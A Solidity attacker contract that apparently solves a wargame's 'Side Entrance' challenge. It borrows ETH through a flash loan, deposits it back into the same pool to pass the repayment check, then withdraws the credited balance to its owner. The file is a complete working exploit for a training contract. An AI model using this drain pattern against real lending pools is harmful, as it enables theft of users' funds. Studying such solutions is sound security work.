// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../side-entrance/SideEntranceLenderPool.sol";
import "solady/src/utils/SafeTransferLib.sol";

contract SideEntranceAttacker {
    address public owner;
    SideEntranceLenderPool public pool;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function withdraw() external {
        pool.withdraw();
        SafeTransferLib.safeTransferETH(owner, address(this).balance);
    }

    function flashLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    receive() external payable {}
}
